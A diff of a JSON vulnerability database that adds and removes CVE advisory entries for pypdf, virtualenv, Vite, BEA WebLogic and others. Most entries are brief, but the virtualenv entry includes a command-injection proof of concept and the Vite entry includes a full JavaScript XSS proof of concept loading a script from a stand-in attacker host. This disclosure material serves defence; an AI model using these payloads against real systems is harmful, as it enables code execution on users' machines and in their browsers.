+      "summary": "### Impact\n\nAn attacker who uses this vulnerability can craft a PDF which leads to an infinite loop. This requires removing an object from a tree, for example an outline item.\n\n### Patches\n\nThis has been fixed in [pypdf==6.20.1](https://github.com/py-pdf/pypdf/releases/tag/6.20.1).\n\n### Workarounds\n\nIf you cannot upgrade yet, consider applying the changes from PR [#4188](https://github.com/py-pdf/pypdf/pull/4188).",
+      "cvssScore": 6,
+      "severity": "Medium",
+      "published": "2026-10-21",
+      "modified": "2026-10-21",
+      "cwe": {
+        "cwe_id": "CWE-835",
+        "name": "Loop with Unreachable Exit Condition ('Infinite Loop')"
+      },
+      "references": [
+        "https://github.com/py-pdf/pypdf/security/advisories/GHSA-9mx8-4j7g-633p",
+        "https://github.com/py-pdf/pypdf/pull/4188",
+        "https://github.com/py-pdf/pypdf/commit/c9c35b4471c2eb5fe078094f6c816e69d4ed25a0",
+        "https://github.com/py-pdf/pypdf/releases/tag/6.20.1",
+        "https://github.com/advisories/GHSA-9mx8-4j7g-633p"
+      ],
+      "vulnerableProducts": [
+        "pypdf pip"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-113794",
+      "summary": "### Impact\n\nAn attacker who uses this vulnerability can craft a PDF which leads to an infinite loop. This requires an incomplete file which ends inside the xref table.\n\n### Patches\n\nThis has been fixed in [pypdf==6.20.0](https://github.com/py-pdf/pypdf/releases/tag/6.20.0).\n\n### Workarounds\n\nIf you cannot upgrade yet, consider applying the changes from PR [#4170](https://github.com/py-pdf/pypdf/pull/4170).\n\n### Notes\n\nThis has been reported through both the secure channel and as a public issue at [#4169](https://github.com/py-pdf/pypdf/issues/4169).",
+      "cvssScore": 6,
+      "severity": "Medium",
+      "published": "2026-10-21",
+      "modified": "2026-10-21",
+      "cwe": {
+        "cwe_id": "CWE-835",
+        "name": "Loop with Unreachable Exit Condition ('Infinite Loop')"
+      },
+      "references": [
+        "https://github.com/py-pdf/pypdf/security/advisories/GHSA-39mj-jf6j-2qj3",
+        "https://github.com/py-pdf/pypdf/issues/4169",
+        "https://github.com/py-pdf/pypdf/pull/4170",
+        "https://github.com/py-pdf/pypdf/commit/37e1cd681744bac38b159f7e1c614eee8d639c58",
+        "https://github.com/py-pdf/pypdf/releases/tag/6.20.0"
+      ],
+      "vulnerableProducts": [
+        "pypdf pip"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-113725",
+      "summary": "### Summary\n\nThe bash `activate` script escapes the environment name for only one of the two passes bash makes over `PS1`, so a\nbackslash in the name undoes the escaping and a name containing `\\$(...)` runs as commands in the user's shell each\ntime bash draws the prompt.\n\n### Affected area\n\n`src/virtualenv/activation/bash/activate.sh`, the block that prepends the environment name to `PS1`.\n\n### Attacker-controlled input\n\nThe environment name: the environment directory's name, or the `--prompt` or `VIRTUALENV_PROMPT` value. An attacker\nneeds to influence it, for example through a CI job or wrapper tool that passes a branch, project or job name through,\nor a directory in a cloned repository or unpacked archive. `--prompt .` takes the current directory's name.\n\n### Details\n\nbash handles `PS1` in two passes each time it draws the prompt: it first decodes backslash prompt escapes, turning `\\\\`\ninto `\\` and `\\$` into `$` (or `#` for root), and then runs parameter expansion, command substitution and arithmetic\nexpansion on the result. Since 21.13.0 the script escapes backslashes, dollar signs and backticks in the name, but only\nfor the second pass, so the decode pass strips the escaping that a backslash in the name precedes. Releases before\n21.13.0 do not escape the name at all. A bash running as root decodes `\\$` to `#`, so the payload shows the wrong text\nthere but runs nothing. zsh does no decode pass and is not affected.\n\n### Proof of concept\n\n```console\n$ virtualenv --prompt 'a\\$(touch PWNED)' env\n$ bash --norc --noprofile -c 'source env/bin/activate; printf \"%s\" \"${PS1@P}\"'\n$ ls PWNED\nPWNED\n```\n\n### Impact\n\nArbitrary command execution in the shell of a user who sources the `activate` script of an environment whose name an\nattacker influenced, with that user's privileges, once per prompt draw.\n\n### Versions tested\n\n21.14.6 with bash 5.2.15 on Debian bookworm, as an unprivileged user and as root.\n\n### Known mitigation\n\nSet `VIRTUAL_ENV_DISABLE_PROMPT=1` before you source `activate`, which leaves `PS1` alone, or run `shopt -u promptvars`\nif your prompt does not need expansion. Check the name of an environment you did not create before you source its\n`activate`.\n\n### Latest release\n\n- [x] The problem reproduces on the latest virtualenv release.\n\n21.14.6\n\n### Patches\n\nFixed in 21.14.7. Under bash, `activate` now escapes backslashes, dollar signs and backticks for both passes, so the\nexample above runs nothing and the prompt shows the name as given. zsh keeps the single escaping it needs.\nFix: https://github.com/pypa/virtualenv/commit/c3104e02474b652832a9bbaae79f6e1696296932\n\n### Credits\n\nFound while running the virtualenv test suite as root inside the Anthropic OSS Scanner build image.",
+      "cvssScore": 7.8,
       "severity": "High",
-      "published": "2026-10-16",
-      "modified": "2026-10-16",
-      "cwe": null,
+      "published": "2026-10-21",
+      "modified": "2026-10-21",
+      "cwe": {
+        "cwe_id": "CWE-78",
+        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+      },
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-94388",
-        "https://patchstack.com/database/wordpress/plugin/halfdata-green-popups/vulnerability/wordpress-green-popups-plugin-7-6-3-sql-injection-vulnerability?_s_id=cve"
+        "https://github.com/pypa/virtualenv/security/advisories/GHSA-vxj4-q4g9-crj7",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-113725",
+        "https://github.com/pypa/virtualenv/commit/c3104e02474b652832a9bbaae79f6e1696296932",
+        "https://github.com/pypa/virtualenv/releases/tag/21.14.7",
+        "https://github.com/advisories/GHSA-vxj4-q4g9-crj7"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "virtualenv pip"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-92427",
-      "summary": "The Coinsnap Bitcoin Crowdfunding WordPress plugin through 1.2.0 does not restrict access to the secret used to authenticate its payment gateway webhook, disclosing it to unauthenticated users and rendering the webhook's signature check ineffective. This allows unauthenticated attackers to forge payment-confirmation notifications and record arbitrary donations as completed, with attacker-chosen amounts, donor names and messages.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-10-16",
-      "modified": "2026-10-16",
-      "cwe": null,
+      "id": "CVE-2026-113795",
+      "summary": "### Impact\n\nAn attacker who uses this vulnerability can craft a PDF which leads to large memory consumption. This requires accessing any stream with a large amount of filters or multiple filters which pass around large amounts of data.\n\n### Patches\n\nThis has been fixed in [pypdf==6.20.0](https://github.com/py-pdf/pypdf/releases/tag/6.20.0).\n\n### Workarounds\n\nIf you cannot upgrade yet, consider applying the changes from PR [#4173](https://github.com/py-pdf/pypdf/pull/4173).",
+      "cvssScore": 6,
+      "severity": "Medium",
+      "published": "2026-10-21",
+      "modified": "2026-10-21",
+      "cwe": {
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
+      },
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-92427",
-        "https://wpscan.com/vulnerability/a5320c81-5ad9-471d-9c58-726b585b801e"
+        "https://github.com/py-pdf/pypdf/security/advisories/GHSA-7mh2-4gg2-979f",
+        "https://github.com/py-pdf/pypdf/pull/4173",
+        "https://github.com/py-pdf/pypdf/commit/80a84d4be6022d910874ccb0d2365400f3f0e185",
+        "https://github.com/py-pdf/pypdf/releases/tag/6.20.0",
+        "https://github.com/advisories/GHSA-7mh2-4gg2-979f"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "pypdf pip"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-1135",
-      "summary": "Buffer overflow in Yahoo! Messenger 5.6 allows remote attackers to cause a denial of service (crash) via a file send request (sendfile) with a large number of \"%\" (percent) characters after the Yahoo ID.",
-      "cvssScore": 2.6,
+      "id": "CVE-2026-112945",
+      "summary": "### Summary\n\nWhen accessing a malicious site while a dev server using Vite is running, that site was able to load scripts in a page served by the dev server.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- the dev server passes an unchanged browser request URL to `server.transformIndexHtml`: this is normally used for `server.middlewareMode: true` or `appType: 'custom'`. The internal call for `appType: 'spa'` and `appType: 'mpa'` does not match this.\n- the transformed HTML contains an inline module script\n- from the script in the page served by the dev server, the app stores sensitive values in the location accessible or allows critical actions\n\n### Details\n\n[Vite's SSR guide for 8.2.1](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131) documents the affected setup. The application embeds Vite in middleware mode, reads trusted HTML, and passes the browser's unchanged request URL to the transform:\n\n```js\nconst url = req.originalUrl\ntemplate = await vite.transformIndexHtml(url, template)\n```\n\nFor a development server at `http://localhost:5173`, an attacker can send this URL:\n\n```text\nhttp://localhost:5173//evil.example/payload.js?/../../package.json\n```\n\nIn Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115) use the request URL as both the transform `path` and the input to `path.join`. The value passed to `path.join` still includes its query text.\n\nChromium preserves `/../../package.json` because it follows `?` and is therefore query text. Vite treats the same characters as filesystem path components, so the `..` components resolve the derived filename to the existing project `package.json`.\n\n[The existing file branch in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232) checks that filename with `fs.existsSync`, then preserves the `htmlPath` supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite in the same file](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278) writes that value into the generated `src`:\n\n```html\n<script type=\"module\" src=\"//evil.example/payload.js?/../../package.json?html-proxy&index=0.js\"></script>\n```\n\nThe generated value is a valid URL. Its leading `//` tells the browser to request the module from `evil.example` using the Vite page's scheme. The attacker returns JavaScript for that request, and Chromium executes it in the Vite page.\n\n### PoC\n\n```js\nimport { createServer as createHttpServer } from 'node:http'\nimport { createRequire } from 'node:module'\nimport { dirname, join } from 'node:path'\nimport { fileURLToPath, pathToFileURL } from 'node:url'\n\nconst directory = dirname(fileURLToPath(import.meta.url))\nconst require = createRequire(join(directory, 'package.json'))\nconst { chromium } = require('playwright-chromium')\nconst viteModule = await import(\n  pathToFileURL(require.resolve('vite')).href\n)\nconst createViteServer =\n  viteModule.createServer ?? viteModule.default.createServer\n\n// This loopback server stands in for a separately hosted attacker website.\nconst attackerPort = 4173\nconst exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`\nconst html = '<script type=\"module\">document.body.textContent = \"Vite app\"</script>'\n\nconst listen = (server, port = 0) =>\n  new Promise((resolve, reject) => {\n    server.once('error', reject)\n    server.listen(port, '127.0.0.1', () => {\n      server.off('error', reject)\n      resolve(server.address().port)\n    })\n  })\n\nconst close = (server) =>\n  new Promise((resolve, reject) => {\n    server.close((error) => (error ? reject(error) : resolve()))\n  })\n\nlet attackerRequest = null\nconst attacker = createHttpServer((request, response) => {\n  attackerRequest = request.url\n  response.writeHead(200, {\n    'access-control-allow-origin': '*',\n    'content-type': 'text/javascript',\n  })\n  response.end(\n    \"document.documentElement.dataset.viteXssPoc = 'executed'\",\n  )\n})\n\nconst vite = await createViteServer({\n  appType: 'custom',\n  configFile: false,\n  root: directory,\n  server: {\n    hmr: false,\n    middlewareMode: true,\n    watch: null,\n  },\n})\n\nconst application = createHttpServer((request, response) => {\n  vite.middlewares(request, response, async (error) => {\n    if (error) {\n      response.destroy(error)\n      return\n    }\n\n    try {\n      const transformed = await vite.transformIndexHtml(request.url, html)\n      response.writeHead(200, { 'content-type': 'text/html' })\n      response.end(transformed)\n    } catch (transformError) {\n      response.destroy(transformError)\n    }\n  })\n})\n\nawait listen(attacker, attackerPort)\nconst applicationPort = await listen(application)\nconst browser = await chromium.launch({ headless: true })\n\ntry {\n  const page = await browser.newPage()\n  await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)\n  await page.waitForFunction(\n    () => document.documentElement.dataset.viteXssPoc === 'executed',\n  )\n\n  console.log(`attacker request: ${attackerRequest}`)\n  console.log('JavaScript from the attacker server executed in the Vite page')\n} finally {\n  await browser.close()\n  await close(application)\n  await vite.close()\n  await close(attacker)\n}\n```\n\nObserved output on Vite 8.2.1:\n```text\nattacker request: /payload.js?/../../package.json?html-proxy&index=0.js\nJavaScript from the attacker server executed in the Vite page\n```",
+      "cvssScore": 2.1,
       "severity": "Low",
-      "published": "2003-12-31",
+      "published": "2026-10-21",
+      "modified": "2026-10-21",
+      "cwe": {
+        "cwe_id": "CWE-80",
+        "name": "Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)"
+      },
+      "references": [
+        "https://github.com/vitejs/vite/security/advisories/GHSA-9jrq-w75r-8gcw",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-112945",
+        "https://github.com/vitejs/vite/pull/23653",
+        "https://github.com/vitejs/vite/commit/7dafd8e56f152403a3230608fa4005273c2e9e17",
+        "https://github.com/advisories/GHSA-9jrq-w75r-8gcw"
+      ],
+      "vulnerableProducts": [
+        "vite npm",
+        "vite-plus npm"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0883",
+      "summary": "The default configuration of mod_perl for Apache as installed on Mandrake Linux 6.1 through 7.1 sets the /perl/ directory to be browseable, which allows remote attackers to list the contents of that directory.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-11-14",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.securityfocus.com/archive/1/342472",
-        "http://www.securityfocus.com/bid/8894",
-        "http://www.securityfocus.com/archive/1/342472",
-        "http://www.securityfocus.com/bid/8894"
+        "http://archives.neohapsis.com/archives/bugtraq/2000-09/0111.html",
+        "http://www.securityfocus.com/bid/1678",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5257",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-09/0111.html",
+        "http://www.securityfocus.com/bid/1678"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-1147",
-      "summary": "Rejected reason: DO NOT USE THIS CANDIDATE NUMBER.  ConsultIDs: CVE-2003-0955.  Reason: This candidate is a duplicate of CVE-2003-0955.  Notes: All CVE users should reference CVE-2003-0955 instead of this candidate.  All references and descriptions in this candidate have been removed to prevent accidental usage",
+      "id": "CVE-2026-100875",
+      "summary": "A vulnerability has been found in mathurvishal CloudClassroom-PHP-Project up to 5dadec098bfbbf3300d60c3494db3fb95b66e7be. This impacts an unknown function of the file updatedetailsfromfaculty.php. Such manipulation of the argument myfid leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. This product operates on a rolling release basis, ensuring continuous delivery. Consequently, there are no version details for either affected or updated releases. The vendor was contacted early about this disclosure but did not respond in any way.",
+      "cvssScore": 7.3,
+      "severity": "High",
+      "published": "2026-09-27",
+      "modified": null,
+      "cwe": "CWE-74",
+      "references": [
+        "https://github.com/rmsbpro/Advisory/blob/main/updatedetailsfromfaculty-sqli.md",
+        "https://vuldb.com/cve/CVE-2026-100875",
+        "https://vuldb.com/submit/915416",
+        "https://vuldb.com/vuln/410805",
+        "https://vuldb.com/vuln/410805/cti"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-100874",
+      "summary": "A flaw has been found in mathurvishal CloudClassroom-PHP-Project up to 5dadec098bfbbf3300d60c3494db3fb95b66e7be. This affects an unknown function of the file addnewstudent.php. This manipulation causes sql injection. The attack may be initiated remotely. The exploit has been published and may be used. This product uses a rolling release model to deliver continuous updates. As a result, specific version information for affected or updated releases is not available. The vendor was contacted early about this disclosure but did not respond in any way.",
+      "cvssScore": 7.3,
+      "severity": "High",
+      "published": "2026-09-27",
+      "modified": null,
+      "cwe": "CWE-74",
+      "references": [
+        "https://github.com/vinniboy021-blip/Advisory/blob/main/addnewstudent-sqli.md",
+        "https://vuldb.com/cve/CVE-2026-100874",
+        "https://vuldb.com/submit/915272",
+        "https://vuldb.com/vuln/410804",
+        "https://vuldb.com/vuln/410804/cti"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0681",
+      "summary": "Buffer overflow in BEA WebLogic server proxy plugin allows remote attackers to execute arbitrary commands via a long URL with a .JSP extension.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2000-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-08/0186.html",
+        "http://www.securityfocus.com/bid/1570",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-08/0186.html",
+        "http://www.securityfocus.com/bid/1570"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0682",
+      "summary": "BEA WebLogic 5.1.x allows remote attackers to read source code for parsed pages by inserting /ConsoleHelp/ into the URL, which invokes the FileServlet.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0410.html",
+        "http://developer.bea.com/alerts/security_000731.html",
+        "http://www.osvdb.org/1481",
+        "http://www.securityfocus.com/bid/1518",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0410.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0683",
+      "summary": "BEA WebLogic 5.1.x allows remote attackers to read source code for parsed pages by inserting /*.shtml/ into the URL, which invokes the SSIServlet.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0410.html",
+        "http://developer.bea.com/alerts/security_000728.html",
+        "http://www.osvdb.org/1480",
+        "http://www.securityfocus.com/bid/1517",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0410.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0684",
+      "summary": "BEA WebLogic 5.1.x does not properly restrict access to the JSPServlet, which could allow remote attackers to compile and execute Java JSP code by directly invoking the servlet on any source file.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2000-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0434.html",
+        "http://developer.bea.com/alerts/security_000731.html",
+        "http://www.securityfocus.com/bid/1525",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0434.html",
+        "http://developer.bea.com/alerts/security_000731.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0685",
+      "summary": "BEA WebLogic 5.1.x does not properly restrict access to the PageCompileServlet, which could allow remote attackers to compile and execute Java JHTML code by directly invoking the servlet on any source file.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2000-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0434.html",
+        "http://developer.bea.com/alerts/security_000731.html",
+        "http://www.securityfocus.com/bid/1525",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0434.html",
+        "http://developer.bea.com/alerts/security_000731.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1121",
+      "summary": "Rejected reason: DO NOT USE THIS CANDIDATE NUMBER. ConsultIDs: CVE-2001-1084. Reason: This candidate is a duplicate of CVE-2001-1084. Notes: All CVE users should reference CVE-2001-1084 instead of this candidate. All references and descriptions in this candidate have been removed to prevent accidental usage",
       "cvssScore": null,
       "severity": "Unknown",
-      "published": "2003-12-31",
+      "published": "2001-07-02",
       "modified": null,
       "cwe": null,
       "references": [],
@@ -257,628 +445,513 @@
       "isExploited": false
     },
     {
-      "id": "CVE-2026-77608",
-      "summary": "#### Failure mode\n\nThe `value` parameter was reflected back into rendered output and error messaging paths without enough output-context encoding.\n\n#### Remediation\n\n- The form value is escaped before it is placed back into the input field.\n- Derived error messages are also escaped before being rendered into HTML.\n\n#### Maintenance note\n\nDo not treat error text as trusted just because it originated from validation. Validation output can still be attacker-influenced.",
-      "cvssScore": 6.1,
-      "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-79",
-        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
-      },
-      "references": [
-        "https://github.com/SemanticMediaWiki/SemanticMediaWiki/security/advisories/GHSA-59xw-qv23-j3rc",
-        "https://github.com/SemanticMediaWiki/SemanticMediaWiki/releases/tag/7.2.0",
-        "https://github.com/advisories/GHSA-59xw-qv23-j3rc"
-      ],
-      "vulnerableProducts": [
-        "mediawiki/semantic-media-wiki composer"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-1495",
-      "summary": "The Repair Archive command in WinRAR 3.40 allows remote attackers to cause a denial of service (application crash) via a corrupt ZIP archive.",
-      "cvssScore": 2.6,
-      "severity": "Low",
-      "published": "2004-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=109941351432699&w=2",
-        "http://secunia.com/advisories/13070",
-        "http://www.rarlabs.com/rarnew.htm",
-        "http://www.securityfocus.com/bid/11581",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17937"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-1496",
-      "summary": "Directory traversal vulnerability in Web Forums Server 1.6 and 2.0 Power Pack allows remote attackers to read arbitrary files via a URL containing (1) \"..\\\" (dot dot backslash), (2) \"../\" (dot dot slash), (3) \"/%2E%2E%5C\" (encoded dot dot backslash), or (4) \"%2E%2E%2F\" (encoded dot dot slash).",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2004-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=109943267328552&w=2",
-        "http://marc.info/?l=bugtraq&m=109943267328552&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0858",
-      "summary": "Vulnerability in Microsoft Windows NT 4.0 allows remote attackers to cause a denial of service in IIS by sending it a series of malformed requests which cause INETINFO.EXE to fail, aka the \"Invalid URL\" vulnerability.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2000-11-14",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/vendor/2000-q3/0065.html",
-        "http://www.securityfocus.com/archive/1/80413",
-        "http://www.securityfocus.com/bid/1642",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5202",
-        "http://archives.neohapsis.com/archives/vendor/2000-q3/0065.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0859",
-      "summary": "The web configuration server for NTMail V5 and V6 allows remote attackers to cause a denial of service via a series of partial HTTP requests.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2000-11-14",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-08/0471.html",
-        "http://www.securityfocus.com/bid/1640",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5182",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-08/0471.html",
-        "http://www.securityfocus.com/bid/1640"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-90561",
-      "summary": "Strapi versions 4.x through 4.26.2 and 5.x before 5.48.1 contain a stored cross-site scripting vulnerability in the content manager WYSIWYG preview component that fails to strip script tags from rich text. An Author-role user can store malicious script tags in rich text fields that execute in an Editor or Super Admin's session when the preview pane is expanded, enabling account takeover.",
-      "cvssScore": 3.8,
-      "severity": "Low",
-      "published": "2026-09-13",
-      "modified": "2026-09-13",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-90561",
-        "https://github.com/strapi/strapi/issues/26857",
-        "https://github.com/strapi/strapi/commit/875752612c30f951546904a29469e51e17e0ac37",
-        "https://github.com/strapi/strapi",
-        "https://github.com/strapi/strapi/blob/v5.46.0/packages/core/content-manager/admin/src/pages/EditView/components/FormInputs/Wysiwyg/PreviewWysiwyg.tsx"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-90768",
-      "summary": "CAPEv2 through commit 471ee4b fails to validate task ownership in REST API endpoints, allowing authenticated users to read and delete analyses submitted by other users. Attackers can enumerate all tasks in the system and delete arbitrary analyses by sending requests to task view and delete endpoints without ownership verification.",
-      "cvssScore": 4.2,
-      "severity": "Medium",
-      "published": "2026-09-13",
-      "modified": "2026-09-13",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-90768",
-        "https://github.com/kevoreilly/CAPEv2/issues/3162",
-        "https://github.com/kevoreilly/CAPEv2",
-        "https://github.com/kevoreilly/CAPEv2/blob/1255b18/web/apiv2/views.py",
-        "https://www.vulncheck.com/advisories/capev2-through-commit-471ee4b-rest-api-task-endpoints-missing-ownership-check"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-90514",
-      "summary": "A vulnerability has been found in SourceCodester School Registration and Fee System 1.0. Impacted is an unknown function of the file /bilal/normal/save_stud.php. Such manipulation of the argument Status leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.",
-      "cvssScore": 6.4,
-      "severity": "Medium",
-      "published": "2026-09-13",
-      "modified": "2026-09-13",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-90514",
-        "https://github.com/zuojiu567/cve/issues/1",
-        "https://vuldb.com/cve/CVE-2026-90514",
-        "https://vuldb.com/submit/912050",
-        "https://vuldb.com/vuln/403101"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-90562",
-      "summary": "LangBot before 4.10.11 generates password recovery keys with only 24 bits of entropy and applies no rate limiting to the unauthenticated reset-password endpoint. Remote attackers knowing the administrator email can exhaust the keyspace through concurrent requests to reset the admin password and gain account access.",
-      "cvssScore": 7.4,
-      "severity": "High",
-      "published": "2026-09-13",
-      "modified": "2026-09-13",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-90562",
-        "https://github.com/langbot-app/LangBot/issues/2392",
-        "https://github.com/langbot-app/LangBot/commit/267232c24f93c515d6fd3f7f81c0676066ab1ab8",
-        "https://github.com/langbot-app/LangBot",
-        "https://github.com/langbot-app/LangBot/blob/v4.10.2/src/langbot/pkg/api/http/controller/groups/user.py"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-90509",
-      "summary": "A weakness has been identified in dromara orion-visor up to 2.5.7. Affected by this issue is the function ExposeApiAspect.beforeExposeApi of the file ExposeApiAspect.java. Executing a manipulation can lead to hard-coded credentials. The attack can be executed remotely. The exploit has been made available to the public and could be used for attacks. The project was informed of the problem early through an issue report but has not responded yet.",
-      "cvssScore": 6.4,
-      "severity": "Medium",
-      "published": "2026-09-13",
-      "modified": "2026-09-13",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-90509",
-        "https://github.com/dromara/orion-visor/issues/170",
-        "https://github.com/dromara/orion-visor",
-        "https://github.com/sumo166/CVE-apply/blob/main/dromara-orion-visor/ExposeApi%20Hardcoded%20Default%20Token%20Authentication%20Bypass%20(CWE-798)_en.md",
-        "https://vuldb.com/cve/CVE-2026-90509"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-90511",
-      "summary": "A vulnerability was detected in GongShengyue OnlineBooks up to dfc5eacc08d3b0396c266049548618f6fb9587ea. This vulnerability affects unknown code of the file src/cn/ylcto/book/servlet/BooksServlet.java of the component listSplit Interface. The manipulation of the argument column results in sql injection. The attack may be performed from remote. The exploit is now public and may be used. This product utilizes a rolling release system for continuous delivery, and as such, version information for affected or updated releases is not disclosed.",
-      "cvssScore": 5.3,
-      "severity": "Medium",
-      "published": "2026-09-13",
-      "modified": "2026-09-13",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-90511",
-        "https://github.com/hhhh333/CVE/blob/main/OnlineBooks-sql.md",
-        "https://vuldb.com/cve/CVE-2026-90511",
-        "https://vuldb.com/submit/911884",
-        "https://vuldb.com/vuln/403099"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-90508",
-      "summary": "A security flaw has been discovered in Chengdu Qilu Technology Ludashi 6.1026.4715.714. Affected by this vulnerability is the function MessageNotifyCallback in the library ProtectFilter64.sys of the component Message Dispatch Handler. Performing a manipulation results in missing authorization. Attacking locally is a requirement. The exploit has been released to the public and may be used for attacks. The vendor was contacted early about this disclosure but did not respond in any way.",
-      "cvssScore": 3.3,
-      "severity": "Low",
-      "published": "2026-09-13",
-      "modified": "2026-09-13",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-90508",
-        "https://gist.github.com/lzty/fc5f336dca4c287ab4c22168b6dc8ec2",
-        "https://vuldb.com/cve/CVE-2026-90508",
-        "https://vuldb.com/submit/895271",
-        "https://vuldb.com/vuln/403096"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
